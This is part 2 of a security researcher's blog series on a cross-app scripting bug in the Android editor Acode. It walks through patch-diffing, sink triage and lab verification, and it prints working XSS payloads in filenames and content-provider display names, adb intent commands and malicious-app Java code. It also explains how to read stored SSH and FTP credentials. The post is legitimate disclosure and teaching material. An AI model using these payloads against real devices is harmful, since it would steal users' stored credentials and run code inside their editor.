---
title: "Cross-app scripting in Acode, part 2: how I found it"
date: 2026-08-17T18:30:00+05:00
categories: ["Research"]
tags: ["android", "webview", "cordova", "xss", "methodology", "mobile"]
description: "Patch-diffing a two-year-old security fix pointed straight at an unpatched sibling sink. The methodology, the lab work, and the single character that silently broke my first payload."
weight: 2
ShowToc: true
TocOpen: false
cover:
  image: "/img/posts/acode/04-palette-broken-image-icon.webp"
---

This is part 2 of three.

1. [What I found](/posts/acode-cross-app-scripting-what-i-found/) — the bug and its impact
2. **How I found it** — you are here
3. [How to prevent it](/posts/acode-cross-app-scripting-how-to-prevent-it/) — the developer takeaway

---

Part 1 described [the bug](/posts/acode-cross-app-scripting-what-i-found/): an unescaped filename
reaching `innerHTML` in Acode's Find-File palette, reachable cross-app from any installed app. This
part is about the process, because the process is the transferable half.

The finding did not come from staring at code hoping something would look wrong. It came from a much
smaller question, asked about a fix that already existed.

## Start from a patch, not from scratch

"Find a bug in this app" is an enormous question. "Which other sinks does *this specific value* reach"
is a small one, and a disclosed bug hands you that value for free.

Acode had a disclosed XSS: issue #1090, fixed December 2024 in commit `42002a67`. Reading that commit
tells you three things immediately:

- **which value the project already considers dangerous** — the filename
- **which sinks they hardened** — `alert.js`, `confirm.js`, `loader.js`
- **whether they fixed the source or just the sinks**

That third point is the one that matters. The commit is four files, `+8/−4`, and adds
`DOMPurify.sanitize()` at three dialog sinks. It touches **no source**. `src/lib/checkFiles.js` still
hands over the raw filename. `helpers.errorMessage()` is byte-identical and still deliberately emits
`<br>`.

A sink-side-only fix is a standing invitation. The dangerous value is still flowing raw; only the
known exits were plugged. Every *other* exit that value can reach is an unfixed instance of the same
bug.

So the question became: where else does the filename go?

## The seven phases

This is the shape I worked in. It is worth writing down because the order matters — phases 3 and 4
are cheap only because phase 2 narrowed what you are looking for.

| Phase | What I did |
|---|---|
| **0 · Target** | Same app, but the **current** release. Open source, Cordova, file editor, stores SSH credentials. |
| **1 · Map** | `aapt2 dump xmltree` on the APK → `MainActivity` accepts `VIEW`/`EDIT` for `text/*` and `content://`. |
| **2 · Sources** | The one that mattered: provider-supplied display names. |
| **3 · Sinks** | `grep innerHTML` over `src/`, excluding vendored ace. About 20 hits. |
| **4 · Connect** | Triage each: does the call site *interpolate*, or pass a constant? |
| **5 · Trigger** | Ctrl-P. That is the whole trigger. |
| **6 · Verify** | Emulator, `logcat`, screenshots — twice, via a real file and via a real malicious app. |
| **7 · Report** | Private advisory through GitHub private vulnerability reporting. |

### Phase 1 — what will the app even accept?

Before reading any JavaScript, find out what the app lets in from outside:

```bash
aapt2 dump xmltree --file AndroidManifest.xml acode_1.12.6.apk
```

`MainActivity` accepts `ACTION_VIEW` and `ACTION_EDIT` for `text/*`, over both `file://` and
`content://`. That last one is the whole attack surface for this bug — it means another app can hand
Acode a file, and therefore hand Acode a filename.

### Phase 3 — find the sinks

```bash
git grep -n "innerHTML" -- src/ | grep -v vendor
```

About 20 hits. That is a small enough number to read every one.

### Phase 4 — the triage question that found it

Twenty sinks is only tractable because most are immediately dismissible. The question to ask at each
call site is not "is this dangerous" but:

> Does this interpolate a value, or pass a constant?

Constants are safe by construction, and you can stop reading. Interpolations need the value traced
back to a source. That single filter turns twenty sites into a handful.

Working through them:

| Site | Verdict |
|---|---|
| `src/dialogs/box.js:55` | Safe. All seven callers pass app-built HTML; `showFileInfo.js` uses mustache, which auto-escapes. |
| `src/dialogs/confirm.js:24` | **Correctly defended.** Guarded by an `isHTML` flag, and `checkFiles.js` passes the filename *without* it, so it lands in `textContent`. |
| `src/lib/console.js:463,471,480` | Injected into the previewed page itself, running in that page's own origin. No privilege boundary crossed. Not a vulnerability. |
| `contextmenu`, `settingsPage`, `wcPage`, `changeMode`, `changeEncoding` | Constants, integers, mustache-escaped, or native-enumerated values. |
| **`src/components/inputhints/index.js:371`** | **Interpolates. No DOMPurify import in the file.** |

That last row is the finding. Everything above it is the work.

The `confirm.js` versus `alert.js` comparison is the cleanest lesson in the codebase: the *same
variable*, `file.filename`, from the *same file*, reaches two dialogs, and only one escapes it. The
difference is one boolean flag.

**Negative results are most of the work.** Twenty `innerHTML` sites, four with attacker-reachable
data, one exploitable. Being able to dismiss sixteen quickly is what makes the search finish.

## Verify in the binary, not the repo

Before building any payload, confirm the vulnerable code is in the artefact you are actually
attacking. Source tags lie about what users run — the version I had checked out and the version
installed did not match.

```bash
unzip -o -q acode_1.12.6.apk -d acode_1126_x
grep -rn "font-size: 1rem" acode_1126_x/assets/www/build/main.js
```

The minified template is right there in the shipped bundle:

```js
{text:`<div style="display: flex; flex-direction: column;">
  <strong ${s?`data-str='${strings["recently used"]}'`:""} style="font-size: 1rem;">${e}</strong>
  <span style="font-size: 0.8rem; opacity: 0.8;">${o}</span>
<div>`,value:n}
```

Ten seconds of `unzip` and `grep` closes the gap between "the repo has this bug" and "the app on the
phone has this bug". Do it before you spend hours on a trigger.

## Route A — a real file on disk

The simplest way to prove the sink is to skip the malicious app entirely and just create a file with
a hostile name, if you can write somewhere Acode reads.

A real filename is a hostile container:

- **255-byte cap**
- **`/` is illegal**, which rules out standard Base64
- the HTML attribute ends up **unquoted**, so no spaces and no `>`

Rather than fight the length limit, split the payload in two:

> The filename carries a tiny loader. The file's own *content* carries the real payload.

File content has no length limit and no character restrictions at all.

```
<img src=x onerror=editorManager.files.forEach(function(f){try{eval(f.session.getValue())}catch(e){}})>.txt
```

That evals every open file's contents. Our file is the payload; the empty scratch tab evals to
nothing.

```bash
D=/sdcard/Android/data/com.foxdebug.acode/files
N='<img src=x onerror=editorManager.files.forEach(function(f){try{eval(f.session.getValue())}catch(e){}})>.txt'

cat payload.js > "$D/$N"
chown <acode-uid>:1078 "$D/$N"

am start -a android.intent.action.VIEW -t text/plain -d "file://$D/$N" \
  -n com.foxdebug.acode/com.foxdebug.acode.MainActivity

input keycombination 113 44   # Ctrl-P
```

## The single character that broke my first payload

My first attempt used an arrow function, because it is shorter:

```
<img src=x onerror=editorManager.files.forEach(f=>eval(f.session.getValue()))>.txt
```

The palette rendered this:

![The Find-File palette showing a broken-image icon followed by the literal text: ...Each(function(f){eval(f.session.getValue())})>.txt](/img/posts/acode/04-palette-broken-image-icon.webp)

A broken-image icon, then the tail of my own payload sitting there as visible text.

It is very easy to read that as "did not work" and move on. It is actually a **partial win**, and the
screen is telling you exactly what went wrong if you read it carefully.

Two separate facts are visible:

1. **The broken-image icon means the injection succeeded.** `innerHTML` parsed a real `<img>` element.
   Had the filename been escaped you would see the literal string `<img src=x ...>` as text. Escaped
   versus parsed is the whole question, and the icon answers it.
2. **The leftover text tells you where the payload was cut.** It breaks right at `f=`.

The reason is HTML attribute parsing. The attribute here is **unquoted**, and in an unquoted attribute
value `>` terminates the tag. The `>` in `f=>` closed the `<img>` early. So `onerror` was only ever
`editorManager.files.forEach(f=` — a syntax error — and everything after the `>` spilled out of the
tag as text.

The fix is to use a form containing no `>`:

```
<img src=x onerror=editorManager.files.forEach(function(f){try{eval(f.session.getValue())}catch(e){}})>.txt
```

`function(f){...}` has no `>`. That is the only change.

The general lesson is worth more than the specific one: **read the rendered output, do not just check
whether it worked.** The escaped-versus-parsed distinction and the exact truncation point told me
which character broke the payload. A screenshot debugged this faster than any tooling would have.

## Route B — the malicious app, which is the real attack

Route A needs filesystem write access. The realistic attack needs nothing, and it is *easier*, because
a `content://` display name has none of a filename's constraints — arbitrary length, `/` allowed,
quotes allowed.

Because quotes are allowed, the attribute can be **double-quoted**, and once it is quoted the `>`
problem from Route A simply does not exist. The canonical payload form works directly:

```java
String b64  = Base64.encodeToString(payloadJs.getBytes(), Base64.NO_WRAP);
String name = "<img src=x onerror=\"eval(atob('" + b64 + "'))\">.txt";
```

My provider served a 2,868-character display name. No loader indirection needed.

The `<queries>` block in the manifest is **not optional** on targetSdk 30+:

```xml
<queries><package android:name="com.foxdebug.acode" /></queries>
```

Without it, package-visibility filtering makes `com.foxdebug.acode` invisible to the attacking app,
`getLaunchIntentForPackage` returns `null`, and the intent silently fails to resolve. It fails quietly,
which is the worst way for it to fail.

## Four environment obstacles, and what each actually was

Almost none of my time went on the vulnerability. It went on the environment. These generalise to any
file-delivery Android bug, so they are worth writing down.

| Symptom | Real cause | Fix |
|---|---|---|
| `E FileUtils: /sdcard/Download/x.txt: open failed: EACCES` | Acode targets a modern SDK, so **scoped storage** applies. `READ_EXTERNAL_STORAGE` does not grant arbitrary path reads. | Stage the file in `/sdcard/Android/data/com.foxdebug.acode/files` instead. |
| File silently never opens, no error at all | I had **percent-encoded** the `file://` URI. Acode fails to resolve the encoded path and does nothing. | Pass the URI unencoded; drive it from a device-side `sh` script so quoting happens once. |
| File visible but unreadable, owned `root root` | `adb` runs as root, so anything it creates is root-owned and the app's uid cannot read it. | `chown <app-uid>:1078` after creating. Derive the uid from `ls -ldn` on the app's own directory, not from `dumpsys`. |
| `Activity not started, task brought to front` | `MainActivity` is `singleTask`, so the intent was folded into the existing task. | `am force-stop` first for a clean `VIEW` delivery. |
| `No content provider: content://...` when sending from `adb shell` | Package-visibility filtering. The shell cannot grant a URI permission for a provider it does not own. | The **attacker app itself** must send the intent, so `FLAG_GRANT_READ_URI_PERMISSION` is meaningful. |

One more that is a nice piece of evidence rather than an obstacle: at one point the INFO dialog showed
a broken-image icon but no JavaScript ran. That is DOMPurify **working correctly** in `alert.js` — it
permits `<img src=x>` and strips `onerror`. Seeing that confirmed both that the 2024 fix holds where
it was applied, and that the palette was a genuinely different, unpatched path.

## Proving impact without causing it

Getting `alert(1)`-equivalent execution is where a lot of writeups stop. It is also where the report
is weakest, because "JavaScript ran" does not tell a maintainer what they are actually risking.

Two recon findings turned execution into demonstrated consequences, and both were cheap:

- `system.getFilesDir()` and `system.listChildren()` let the payload list any directory
  (`src/plugins/system/www/plugin.js:45,62`).
- Saved credentials live in `localStorage.storageList`, and `Url.formate()` (`src/utils/Url.js:234`)
  stores username and password **inside the URL**. So one `localStorage` read returns plaintext
  credentials — no bridge call needed at all.

The credential-storage detail took reading two files. It is the difference between reporting "an XSS"
and reporting "an XSS that steals SSH credentials", which is the difference between a Medium and a
High.

Where I stopped, deliberately:

| | |
|---|---|
| Demonstrated confidentiality loss | listed the private sandbox, read a stored FTP credential in plaintext |
| Demonstrated integrity loss | wrote a marker file into Acode's private directory |
| Did **not** | call `sftp.exec`, connect to any host, call `setExec`, delete anything, or send a byte off-device |

The demo credential points at `198.51.100.23` — RFC 5737 TEST-NET-2, non-routable — and I seeded it
myself. A report has to *demonstrate* impact, not *cause* it. Running a remote command adds no
evidentiary weight and converts a proof of concept into an attack.

## What I would carry to the next target

**Patch-diffing beats fresh hunting.** The disclosed bug named the untrusted value for me. All I had
to ask was which other sinks it reaches. That is a far smaller question than "find a bug".

**A sink-side-only fix is a lead, not a dead end.** When a project sanitises at sinks and leaves
sources emitting raw values, every new sink is a fresh instance of the old bug. Check whether the fix
touched the source. If it did not, go hunting for siblings.

**Trigger difficulty is not a property of the app.** Same value, same app: the 2024 path needed
open → delete → resume. This one needs one keystroke users press constantly. A harder-to-reach sink is
not a safer sink.

**Know which container you are in.** A filename is hostile — 255 bytes, no `/`, unquoted attribute. A
`content://` display name is permissive. Recognising which one you are in tells you whether you need
loader indirection or can inline the whole payload.

**Verify in the shipped artefact.** `unzip` and `grep` the release APK.

**A broken-image icon is a win.** Learn to read escaped versus parsed.

---

Part 3 is the developer-facing half: why the sink-side fix pattern keeps failing in this codebase,
what the durable fix looks like, and how to find this class of bug in your own hybrid app.

**[Part 3: How to prevent it →](/posts/acode-cross-app-scripting-how-to-prevent-it/)**
